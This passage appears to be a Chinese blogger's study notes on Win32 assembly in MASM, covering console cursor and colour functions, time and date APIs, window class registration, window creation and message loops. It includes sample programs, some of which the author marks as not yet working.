STD_OUTPUT_HANDLE\tmov outHandle,eax\t.REPEAT INVOKE WriteConsole,\toutHandle, ; 控制台输出句柄\tADDR message, ; 字符串指针\tmessageSize, ; 字符串长度\tADDR bytesWritten, ; 返回已写字节数\t0 ; 未使用\tinc lineNum ; 下一行编号\t.UNTIL lineNum &gt; 5\t; 调整控制台窗口相对于屏幕缓冲区的大小和位置\tINVOKE SetConsoleWindowInfo,\toutHandle,\tTRUE,\tADDR windowRect\tinvoke\tExitProcess,NULLend start;----------------------------------------------------- SetConsoleScreenBufferSize可以将屏幕缓冲区设置为 X 列 * Y 行。其原型如下： 123SetConsoleScreenBufferSize PROTO, hConsoleOutput:HANDLE, ;屏幕缓冲区句柄 dwSize:COORD ;新屏幕缓冲区大小 控制台光标设置函数Win32 API 提供了函数用于设置控制台应用光标的大小、可见度和屏幕位置。 与这些函数相关的重要是 CONSOLE_CURSOR_INFO，其中包含了控制台光标的大小和可见度信息： 1234CONSOLE_CURSOR_INFO STRUCT dwSize DWORD ? bVisible DWORD ?CONSOLE_CURSOR_INFO ENDS wSize 为光标填充的字符单元格的百分比（从 1 到 100）。 如果光标可见，则 bVisible 等于 TRUE(1)。 GetConsoleCursorInfo返回控制台光标的大小和可见度。需向其传递指向结构 CONSOLE_CURSOR_INFO 的指针： 123GetConsoleCursorInfo PROTO, hConsoleOutput:HANDLE, lpConsoleCursorInfo:PTR CONSOLE_CURSOR_INFO 默认情况下，光标大小为 25，这表示光标占据了 25% 的字符单元格 SetConsoleCursorInfo设置光标的大小和可见度。需向其传递指向结构 CONSOLE_CURSOR_INFO 的指针： 123SetConsoleCursorInfo PROTO, hConsoleOutput:HANDLE, lpConsoleCursorInfo:PTR CONSOLE_CURSOR_INFO SetConsoleCursorPosition设置光标的 X、Y 位置。向其传递一个 COORD 结构和控制台输岀句柄： 123SetConsoleCursorPosition PROTO, hConsoleOutput:DWORD, ;输入模式句柄 dwCursorPosition:COORD ;屏幕 X、Y 坐标 控制台文本颜色控制台窗口中的文本颜色有两种控制方法。 通过调用 SetConsoleTextAttribute 来改变当前文本颜色，这种方法会影响控制台中所有后续输出文本。 调用 WriteConsoleOutputAttribute 来设置指定单元格的属性。函数 GetConsoleScreenBufferlnfo 返回当前屏幕的颜色以及其他控制台信息。 SetConsoleTextAttribute函数 SetConsoleTextAttribute 可以设置控制台窗口所有后续输出文本的前景色和背景色。原型如下： 123SetConsoleTextAttribute PROTO, hConsoleOutput:HANDLE, ;控制台输出句柄 wAttributes : WORD ;颜色属性 颜色值保存在 wAttributes 参数的低字节中。 WriteConsoleOutputAttribute函数 WriteConsoleOutputAttribute 从指定位置开始，向控制台屏幕缓冲区的连续单元格复制一组属性值。原型如下： 123456WriteConsoleOutputAttribute PROTO, hConsoleOutput:DWORD, ;输出句柄 lpAttribute:PTR WORD, ;写属性 nLength:DWORD, ;单元格数 dwWriteCoord :COORD, ;第一个单元格坐标 lpNumberOfAttrsWritten:PTR DWORD ;输出计数 其中： lpAttribute 指向属性数组，其中每个字节的低字节都包含了颜色值； nLength 为数组长度； dwWriteCoord 为接收属性的开始屏幕单元格； lpNumberOfAttrsWritten 指向一个变量，其中保存的是已写单元格的数量。 例子 这个例子有误,后续改进 12345678910111213141516171819202122232425262728293031323334include Dqx.inc.dataoutHandle HANDLE ?cellsWritten DWORD ?xyPos COORD &lt;10,2&gt;; 字符编号数组buffer BYTE 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 BYTE 16,17,18,19.20BufSize DWORD ($ - buffer); 属性数组attributes WORD 0Fh,0Eh,0Dh,0Ch,0Bh,0Ah,9,8,7,6 WORD 5,4,3,2,1,0F0h,0E0h,0D0h,0C0h,0B0h.codestart:\t; 获取控制台标准输出句柄\tINVOKE GetStdHandle,STD_OUTPUT_HANDLE\tmov outHandle,eax\t; 设置相邻单元格颜色\tINVOKE WriteConsoleOutputAttribute,\toutHandle, ADDR attributes,\tBufSize, xyPos,\tADDR cellsWritten\t; 写 1 到 20 号字符\tINVOKE WriteConsoleOutputCharacter,\toutHandle, ADDR buffer, BufSize,\txyPos, ADDR cellsWritten\tinvoke\tExitProcess,NULLend start;----------------------------------------------------- Win32时间与日期函数函数一览表 函数 说明 CompareFileTime 比较两个 64 位的文件时间 DosDateTimeToFileTime 把 MS-DOS 日期和时间值转换为一个 64 位的文件时间 FileTimeToDosDateTime 把 64 位文件时间转换为 MS-DOS 日期和时间值 FileTimeToLocalFileTime 把 UTC（通用协调时间）文件时间转换为本地文件时间 FileTimeToSystemTime 把 64 位文件时间转换为系统时间格式 GetFileTime 检索文件创建、最后访问和最后修改的日期与时间 GetLocalTime 检索当前本地日期和时间 GetSystemTime 以 UTC 格式检索当前系统日期和时间 GetSystemTimeAdjustment 决定系统是否对其日历钟进行周期性时间调整 GetSystemTimeAsFileTime 以 UTC 格式检索当前系统日期和时间 GetTickCount 检索自系统启动后经过的毫秒数 GetTimeZoneInformation 检索当前时区参数 LocalFileTimeToFileTime 把本地文件时间转换为基于 UTC 的文件时间 SetFileTime 设置文件创建、最后访问和最后修改的日期与时间 SetLocalTime 设置当前本地时间与日期 SetSystemTime 设置当前系统时间与日期 SetSystemTimeAdjustment 启用或禁用对系统日历钟进行周期性时间调整 SetTimeZoneInformation 设置当前时区参数 SystemTimeToFileTime 把系统时间转换为文件时间 SystemTimeToTzSpecificLocalTime 把 UTC 时间转换为指定时区对应的本地时间 SYSTEMTIME 结构SYSTEMTIME 结构由 Windows API 的日期和时间函数使用： 12345678910SYSTEMTIME STRUCT wYear WORD ? ;年（4 个数子） wMonth WORD ? ;月（1 ~ 12） wDayOfWeek WORD ? ;星期（0 ~ 6） wDay WORD ? ;日（1 ~ 31） wHour WORD ? ;小时（0 ~ 23） wMinute WORD ? ;分钟（0 ~ 59） wSecond WORD ? ;秒（0 ~ 59） wMilliseconds WORD ? ;毫秒（0 ~ 999）SYSTEMTIME ENDS 字段 wDayOfWeek 的值依序为星期天 &#x3D; 0，星期一 &#x3D; 1，以此类推。wMilliseconds 中的值不确定，因为系统可以与时钟源同步周期性地刷新时间。 FILETIMEFILETIME 结构把 64 位四字分割为两个双字： 1234FILETIME STRUCT loDateTime DWORD ? hiDateTime DWORD ?FILETIME ENDS GetLocalTime 和 SetLocalTime函数 GetLocalTime 根据系统时钟返回日期和当前时间。 时间要调整为本地时区。 调用该函数时，需向其传递一个指针指向 SYSTEMTIME 结构： 12GetLocalTime PROTO, lpSystemTime:PTR SYSTEMTIME 函数 GetLocalTime 调用示例如下： 1234.datasysTime SYSTEMTIME &lt;&gt;.codeINVOKE GetLocalTime, ADDR sysTime 函数 SetLocalTime 设置系统的本地日期和时间。 调用时，需向其传递一个指针指向包含了期望日期和时间的 SYSTEMTIME 结构： 12SetLocalTime PROTO, lpSystemTime:PTR SYSTEMTIME 如果函数执行成功，则返回非零整数；如果失败，则返回零 GetTickCount返回从系统启动起经过的毫秒数： 1GetTickCount PROTO ; EAX 为返回值 由于返回值为一个双字，因此当系统连续运行 49.7 天后，时间将会回绕归零 。可以使用这个函数监视循环经过的时间，并在达到时间限制时终止循环。 Sleep有些时候程序需要暂停或延迟一小段时间。虽然可以通过构造一个计算循环或忙循环来保持处理器工作，但是不同的处理器会使得执行时间不同 Win32 函数 Sleep 按照指定毫秒数暂停当前执行的线程 12Sleep PROTO, dwMilliseconds:DWORD GetDateTimeGetDateTime 以 100 纳秒为间隔，返回从 1601 年 1 月 1 日起经过的时间间隔数。 如果想要为日期计算准备系统日期&#x2F;时间值，Win32 SDK 建议采用如下步骤： 调用函数，如 GetLocalTime，填充 SYSTEMTIME 结构。 调用函数 SystemTimeToFileTime，将 SYSTEMTIME 结构转换为 FILETIME 结构。 将得到的 FILETIME 结构复制到 64 位的四字。 图形化的Windows应用程序下表列出了编写该程序时需要的各种链接库和头文件。 文件名 说明 WinApp.asm 程序源代码 GraphWin.asm 头文件，包含程序要使用的结构、常量和函数原型 kernel32.lib 本章前面使用的 MS-Windows API 链接库 user32.lib 其他 MS-Windows API 函数 必要的结构结构 POINT 以像素为单位，定义屏幕上一个点的 X 坐标和 Y 坐标。它可以用于定位图形对象、窗口和鼠标点击： 1234POINT STRUCT ptX DWORD ? ptY DWORD ?POINT ENDS 结构 RECT 定义矩形边界。成员 left 为矩形左边的 X 坐标，成员 top为矩形上边的 Y 坐标。成员 right 和 bottom 保存矩形类似的值 123456RECT STRUCT left DWORD ? top DWORD ? right DWORD ? bottom DWORD ?RECT ENDS 结构 MSGStruct 定义 MS-Windows 需要的数据： 12345678MSGStruct STRUCT msgWnd DWORD ? msgMessage DWORD ? msgWparam DWORD ? msgLparam DWORD ? msgTime DWORD ? msgPt POINT &lt;&gt;MSGStruct ENDS 结构 WNDCLASS 定义窗口类。 程序中的每个窗口都必须属于一个类，并且每个程序都必须为其主窗口定义一个窗口类。 在主窗口可以显示之前，这个类必须要注册到操作系统： 123456789101112WNDCLASS STRUC style DWORD ? ;窗口样式选项 lpfnWndProc DWORD ? ; winProc 函数指针 cbClsExtra DWORD ? ;共享内存 cbWndExtra DWORD ? ;附加字节数 hlnstance DWORD ? ;当前程序句柄 hlcon DWORD ? ;图标句柄 hCursor DWORD ? ;光标句柄 hbrBackground DWORD ? ;背景刷句柄 IpszMenuName DWORD ? ;菜单名指针 IpszClassName DWORD ? ; WinCZLass 名指针WNDCLASS ENDS 下面对WNDCLASS上述参数进行简单小结： style 是不同样式选项的集合，比如 WS_CAPTION 和 WS_BORDER，用于控制窗口外观和行为。 lpfnWndProc 是指向函数的指针，该函数接收并处理由用户触发的事件消息。 cbClsExtra 指向一个类中所有窗口使用的共享内存。可以为空。 cbWndExtra 指定分配给后面窗口实例的附加字节数。 hInstance 为当前程序实例的句柄。 hIcon 和 hCursor 分别为当前程序中图标资源和光标资源的句柄。 hbrBackground 为背景（颜色）刷的句柄。 lpszMenuName 指向一个菜单名。 lpszClassName 指向一个空字节结束的字符串，该字符串中包含了窗口的类名称。 WinMain过程每个 Windows 应用程序都需要一个启动过程，通常将其命名为 WinMain，该过程负责下述任务： 得到当前程序的句柄。 加载程序的图标和光标。 注册程序的主窗口类，并标识处理该窗口事件消息的过程。 创建主窗口。 显示并更新主窗口。 开始接收和发送消息的循环，直到用户关闭应用程序窗口 WinMain 包含一个名为 GetMessage 的消息处理循环， 从程序的消息队列中取出下一条可用消息。 如果 GetMessage 取出的消息是 WM_QUIT，则返回零，即通知 WinMain 暂停程序。 对于其他消息，WinMain 将它们传递给 DispatchMessage 函数，该函数再将消息传递给程序的 WinProc 过程。若 WinProc过程WinProc 程接收并处理所有与窗口有关的事件消息。这些事件绝大多数是由用户通过点击和拖动鼠标、按下键盘按键等操作发起的。这个过程的工作就是解码每个消息，如果消息得以识别，则在应用程序中执行与该消息相关的任务 过程声明如下： 12345WinProc PROC,hWnd: DWORD, ;窗口句柄localMsg: DWORD, ;消息 IDwParam:DWORD, ;参数 1 （可变）lParam: DWORD ;参数 2 （可变） 根据具体的消息 ID， 第三个和第四个参数的内容可变。 比如，若点击鼠标，那么 lParam 就为点击位置的 X 坐标和 Y 坐标。 在后面的示例程序中，WinProc 过程处理了三种特定的消息： WM_LBUTTONDOWN，用户按下鼠标左键时产生该消息 WM_CREATE，表示刚刚创建主窗口 WM_CLOSE，表示将要关闭应用程序主窗口 ErrorHandler过程 ErrorHandler 是可选的，如果在注册和创建程序主窗口的过程中系统报错，则调用该过程。 比如，如果成功注册程序主窗口，则函数 RegisterClass 返回非零值。 但是，如果该函数返回值为零，那么就调用 ErrorHandler( 显示一条消息 ) 并退出程序 例子 12345INVOKE RegisterClass, ADDR MainWin.IF eax == 0 call ErrorHandler jmp Exit_Program.ENDIF 过程 ErrorHandler 需要执行几个重要任务： 调用 GetLastError 取得系统错误号。 调用 FormatMessage 取得合适的系统格式化的错误消息字符串。 调用 MessageBox 显示包含错误消息字符串的弹出消息框。 调用 LocalFree 释放错误消息字符串使用的内存空间。 又一个无法运行的例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157; Windows Application (WinApp.asm); This program displays a resizable application window and; several popup message boxes.; Thanks to Tom Joyce for creating a prototype; from which this program was derived.INCLUDE Dqx.inc;==================== DATA =======================.dataAppLoadMsgTitle BYTE &quot;Application Loaded&quot;,0AppLoadMsgText BYTE &quot;This window displays when the WM_CREATE &quot; BYTE &quot;message is received&quot;,0PopupTitle BYTE &quot;Popup Window&quot;,0PopupText BYTE &quot;This window was activated by a &quot; BYTE &quot;WM_LBUTTONDOWN message&quot;,0GreetTitle BYTE &quot;Main Window Active&quot;,0GreetText BYTE &quot;This window is shown immediately after &quot; BYTE &quot;CreateWindow and UpdateWindow are called.&quot;,0CloseMsg BYTE &quot;WM_CLOSE message received&quot;,0ErrorTitle BYTE &quot;Error&quot;,0WindowName BYTE &quot;ASM Windows App&quot;,0className BYTE &quot;ASMWin&quot;,0; Define the Application&#x27;s Window class structure.MainWin WNDCLASS &lt;NULL,WinProc,NULL,NULL,NULL,NULL,NULL, \\\tCOLOR_WINDOW,NULL,className&gt;msg MSGStruct &lt;&gt;winRect RECT &lt;&gt;hMainWnd DWORD ?hInstance DWORD ?;=================== CODE =========================.codeWinMain PROC; Get a handle to the current process.\tINVOKE GetModuleHandle, NULL\tmov hInstance, eax\tmov MainWin.hInstance, eax; Load the program&#x27;s icon and cursor.\tINVOKE LoadIcon, NULL, IDI_APPLICATION\tmov MainWin.hIcon, eax\tINVOKE LoadCursor, NULL, IDC_ARROW\tmov MainWin.hCursor, eax; Register the window class.\tINVOKE RegisterClass, ADDR MainWin\t.IF eax == 0 call ErrorHandler jmp Exit_Program\t.ENDIF; Create the application&#x27;s main window.; Returns a handle to the main window in EAX.\tINVOKE CreateWindowEx, 0, ADDR className, ADDR WindowName,MAIN_WINDOW_STYLE, CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT, CW_USEDEFAULT,NULL,NULL,hInstance,NULL\tmov hMainWnd,eax; If CreateWindowEx failed, display a message &amp; exit.\t.IF eax == 0 call ErrorHandler jmp Exit_Program\t.ENDIF; Show and draw the window.\tINVOKE ShowWindow, hMainWnd, SW_SHOW\tINVOKE UpdateWindow, hMainWnd; Display a greeting message.\tINVOKE MessageBox, hMainWnd, ADDR GreetText, ADDR GreetTitle, MB_OK; Begin the program&#x27;s message-handling loop.Message_Loop:\t; Get next message from the queue.\tINVOKE GetMessage, ADDR msg, NULL,NULL,NULL\t; Quit if no more messages.\t.IF eax == 0 jmp Exit_Program\t.ENDIF\t; Relay the message to the program&#x27;s WinProc.\tINVOKE DispatchMessage, ADDR msg jmp Message_LoopExit_Program: INVOKE ExitProcess,0WinMain ENDP;-----------------------------------------------------WinProc PROC,\thWnd:DWORD, localMsg:DWORD, wParam:DWORD, lParam:DWORD; The application&#x27;s message handler, which handles; application-specific messages. All other messages; are forwarded to the default Windows message; handler.;-----------------------------------------------------\tmov eax, localMsg\t.IF eax == WM_LBUTTONDOWN ; mouse button? INVOKE MessageBox, hWnd, ADDR PopupText, ADDR PopupTitle, MB_OK jmp WinProcExit\t.ELSEIF eax == WM_CREATE ; create window? INVOKE MessageBox, hWnd, ADDR AppLoadMsgText, ADDR AppLoadMsgTitle, MB_OK jmp WinProcExit\t.ELSEIF eax == WM_CLOSE ; close window? INVOKE MessageBox, hWnd, ADDR CloseMsg, ADDR WindowName, MB_OK INVOKE PostQuitMessage,0 jmp WinProcExit\t.ELSE ; other message? INVOKE DefWindowProc, hWnd, localMsg, wParam, lParam jmp WinProcExit\t.ENDIFWinProcExit:\tretWinProc ENDP;---------------------------------------------------ErrorHandler PROC; Display the appropriate system error message.;---------------------------------------------------.datapErrorMsg DWORD ? ; ptr to error messagemessageID DWORD ?.code\tINVOKE GetLastError\t; Returns message ID in EAX\tmov messageID,eax\t; Get the corresponding message string.\tINVOKE FormatMessage, FORMAT_MESSAGE_ALLOCATE_BUFFER + \\ FORMAT_MESSAGE_FROM_SYSTEM,NULL,messageID,NULL, ADDR pErrorMsg,NULL,NULL\t; Display the error message.\tINVOKE MessageBox,NULL, pErrorMsg, ADDR ErrorTitle, MB_ICONERROR+MB_OK\t; Free the error message string.\tINVOKE LocalFree, pErrorMsg\tretErrorHandler ENDPEND WinMain 窗口一些变量前缀WS :Windows Style WM:windows message 函数(供查看)GetModuleHandle 获取句柄1invoke GetModuleHandle ,lpMouleName(含有模块的字符串指针) 他的返回值放在了eax中(之前说过) 但是我们通常会用到这么一个返回值,于是我们要建立一个变量去保存它 比如 1234567 .datastr db &quot;user32.dll&quot;hInstance\tdd ? .code\t..... invoke GetModuleHandle ,addr str mov hInstance,eax 如果,lpMouleName&#x3D;NULL 表示调用自己 RegisterClassEx 窗口注册用于窗口的注册 1invoke\tRegisterClassEx, 窗口结构体类型的指针 在这之前,那个窗口结构体要完成初始化 好比这个样子 12345678910mov\t@stWndClass.hCursor, eaxpush\thInstancepop\t@stWndClass.hInstancemov\t@stWndClass.cbSize, sizeof WNDCLASSEXmov\t@stWndClass.style, CS_HREDRAW or CS_VREDRAWmov\t@stWndClass.lpfnWndProc,\toffset _ProcWinMainmov\t@stWndClass.hbrBackground,\tCOLOR_WINDOW + 1mov\t@stWndClass.lpszClassName,\toffset szClassNameinvoke\tRegisterClassEx, addr @stWndClass 关于窗口结构体的与成员介绍 1234567891011121314151617wndclassex struct hIcon; dd\t?\t;窗口图标\thIconSm; dd\t?\t;小图标\thCursor; dd\t?\t;窗口光标\tlpszMenuName;\tdd\t?\t;窗口菜单\thInstance; dd\t?\t;实例句柄\tcbSize dd\t?\t;结构体字节数,用sizeof计算\tstyle; dd\t?\t;类风格\thbrBackground;\tdd\t?\t;背景色\tlpszClassName;\tdd\t?\t;Class_Name的字符串地址\tcbClsExtra; dd\t?\t;\tcbWndExtra; dd\t?\t;\tlpfnWndProc;\tdd\t?\t;窗口过程的地址wndclassex ends hIcon; dd\t?\t;窗口图标显示在窗口左上角的图标, LoadIcon函数获取资源文件的图标,如果想自定义图标就去资源文件中定义 hCursor; dd\t?\t;窗口光标鼠标在窗口的样子 LoadCursor函数指定鼠标在窗口光标的形状,,如果想自定义光标就去资源文件中定义 lpszMenuName;\tdd\t?\t;窗口菜单详情见&lt;&lt;琢石成器&gt;Page.101 hInstance; dd\t?\t;实例句柄指定注册的窗口属于哪个模块 在书上的代码中是这样初始化的 12push\thInstance ;hinstance是已经被初始化的一个句柄pop\t@stWndClass.hInstance\t;这这是一个引用的 cbSize dd\t?\t;结构体字节数,用sizeof计算详情见详情见&lt;&lt;琢石成器&gt;Page.101 style; dd\t?\t;窗口的风格,常见的参数,CS_HREADRAW与CS_VREDRAW 小写cs_hredraw,cs_vredraw 还有个CS_DBLCLKS,小写cs_dblclks,指定了它,windows才会把快速双击的鼠标的行为翻译为WM_LNUTTONDBLCLK发送给窗口过程 小写wm_lbuttondblclk, hbrBackground;\tdd\t?\t;背景色br是brush的意思,h句柄 windows与预定义了一些刷子,用GetStockObject 函数 1invoke GetStockObject,WHITE_BRUSH windows 预定义了一些颜色,如COLOR_MENU,使用类似的颜色要+1 1mov\t@stWndClass.hbrBackground,\tCOLOR_WINDOW + 1 lpszClassName;\tdd\t?\t;Class_Name的字符串地址 cbClsExtra&#x2F;cbWndExtracbClsExtra; dd\t?\t; cbWndExtra; dd\t? 分别代表了windows内部保存的窗口结构体和类结构体给我们预留的内存大小 用于存放自定义的数据 lpfnWndProc;\tdd\t?\t;窗口过程的地址信息的交互需要使用它 它好像是窗口的窗口的地址,就是procMain 有了它windows就知道DispatchMessage函数把窗口的信息发送到哪里去 CreateWindowEx 建立窗口1234567891011invoke CreateWindowEx,\\ dwExStyle,\\ lpClassName,\\ lpwindowName,\\ dwStyle,\\ x,y,\\ nWidth,nHeight,\\ hWndParent,\\ hMenu,\\ hInstance,\\ lpParam 例子 1234567invoke\tCreateWindowEx, WS_EX_CLIENTEDGE, offset szClassName, offset szCaptionMain,\\ WS_OVERLAPPEDWINDOW,\\ 100,100,600,400,\\ NULL,NULL,hInstance,NULL lpClassName 之前注册的窗口类初始化后目标是使用lpClassName类建立窗口 lpwindowName 窗口标题栏字符串地址是一个字符串的指针 hMenu 菜单句柄如果参数是NULL,就去使用之前在注册窗口时的menu句柄 如果参数是一个新的menu,就去使用新的句柄 如果注册窗口类是没有muen,这里也没有menu句柄,就啥也不显示 lpParam见&lt;&lt;琢石成器&gt;&gt;.103 hinstance指定窗口所属的程序模块 hWndParent 窗口所属父窗口主要用于在父窗口销毁时一同将子窗口销毁 x,y指定窗口左上角的位置 默认可指定CW_USEDEFAULT nWidth,nHeight窗口的宽度高度 默认可指定CW_USEDEFAULT dwStyle&#x2F;dwExStyle详情见见&lt;&lt;琢石成器&gt;&gt;.104 Showwindows 显示窗口主要用于窗口的显示状态(显示&#x2F;隐藏) 大小控制 是否激活(当前窗口还是背后窗口) 1invoke\tShowWindow,hWinMain,SW_SHOWNORMAL 第一个参数是窗口的句柄..啊?什么时候定义的句柄? 在Crreatwindows的时候 12345invoke\tCreateWindowEx,WS_EX_OVERLAPPEDWINDOW,offset szClassName,offset szCaptionMain,\\\tWS_OVERLAPPEDWINDOW,\\\t100,100,600,400,\\\tNULL,NULL,hInstance,NULLmov\thWinMain,eax 这里的eax是一个返回的窗口句柄 第二个参数是显示方式的预定义值 详情见见&lt;&lt;琢石成器&gt;&gt;.106 UpdateWindow 绘制客户区本质是向窗口发送WM_PAINT消息 1invoke\tUpdateWindow,hWinMain 参数是窗口的句柄 CreatewindowEx 建立子窗口Windows有很多预定义的子窗口 好比Button&#x2F;Edit,要建立一个子窗口就把lpClassName指向”Button”或者啥的 1234567891011 .dataszButton\tdb\t&quot;button&quot;,0szButtonText\tdb\t&quot;&amp;OK&quot;,0 ... invoke\tCreateWindowEx,NULL,\\ offset\tszButton,offset szButtonText,\\ WS_CHILD or WS_VISIBLE,\\ 10,10,65,22,\\ hWnd,1,hInstance,NULL ;这里的1是ID 消息循环代码示意 123456.while\tTRUE\tinvoke\tGetMessage,addr @stMsg,NULL,0,0\t.break\t.if eax\t== 0\tinvoke\tTranslateMessage,addr @stMsg\tinvoke\tDispatchMessage,addr @stMsg.endw 消息循环用到的结构体 12345678MSG\tstruct\thwnd\tdd\t?;消息要发送到哪里去,\tmessage\tdd\t?;消息标识符,在头文件WM开头的有预定义值\twparam\tdd\t?\tlParam\tdd\t?\ttime\tdd\t?\tpt\tPOINT\t?;一个POINT数据结构,表示消息放入消息队列的鼠标坐标MSG\tends hwnd:消息要发送到哪里去, message:消息标识符,在头文件WM开头的有预定义值 wParam:消息参数之一 lParam:消息参数之二 time:消息放入消息队列的时间 pt:一个POINT数据结构,表示消息放入消息队列的鼠标坐标 GetMessage1invoke GetMessage,lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax lpMsg: 指向一个Msg结构,函数会在这里返回取到的消息 hWnd:指定获取哪个窗口的信息,如果是NULL,表示获取所拥有本程序所属窗口的信息(不太理解) wMsgFilterMin,wMsgFilterMax:表示获取所拥有编号的信息 GetMessage函数会从消息队列里获取信息,填写好MSG结构并返回,如果获取信息是MSG_QUIT 那么eax返回值是0,否者返回非零, 于是循环推出的条件就是.if !eax .break TranslateMessage他将MSG的结构体信息给windows,然后进行一些键盘信息的转换, 在windows小,你敲击键盘会有扫描码与断码,产生的消息队列是WM_KEYDOWN&#x2F;WM_KEYUP 或者WM_SYSKEYDOWN&#x2F;WM_YSYSKEYUP windows对这个过程的处理很麻烦 不怎么理解 TranslateMessage直接把你的扫描码转化为ASCII,并在消息队列中插入WM_CHAR或者WM_SYSCHAR 对于一些非键盘的输入,函数不做处理 DispatchMessage在上面2个函数下,DispatchMessage函数将消息发送到消息对应的窗口过程去处理,处理过程返回,DispatchMessage才返回 然后开始一轮新的循环 其它形式的消息循环例题的代码是 123456789.while\tTRUE\tinvoke\tGetMessage, addr @stMsg,NULL,0,0\t.break\t.if eax\t== 0\tinvoke\tTranslateMessage,\taddr @stMsg\tinvoke\tDispatchMessage,\taddr @stMsg\t;获取\t;翻译\t;发送.endw 这让CPU一直在干3件事情,而这3件事情根本没有变化,这样浪费了CPU 我很疑惑,什么叫有消息???????,什么叫消息队列有消息??? 123456invoke\tCreateWindow,invoke\tShowWindow,invoke\tUpdateWindows,.while\tdwQuitFlag==0.endwinvoke\tExitProcsee,0 对于这种方式我不是特别的理解 他是如何GetMessage的 12345678910.while TRUE\tinvoke PeekMessage,addr @stMsg,NULL,0,0,PM_REMOVE\t.if\teax .break .if @stMsg.message==WM_QUIT invoke TranslateMessage,addr @stMsg invoke\tDispatchMessage,addr @stMsg\t.else invoke\tMessageBox,NULL,offset szText1,offset szCaption1,MB_OK\t.endif.endw 对于下面的代码我没有调试明白 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Sample code for &lt; Win32ASM Programming 3rd Edition&gt;; by 罗云彬, http://www.win32asm.com.cn;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; FirstWindow.asm; 窗口程序的模板代码;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff FirstWindow.asm; Link /subsystem:windows FirstWindow.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude gdi32.incincludelib\tgdi32.libinclude user32.incincludelib\tuser32.libinclude kernel32.incincludelib\tkernel32.lib;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 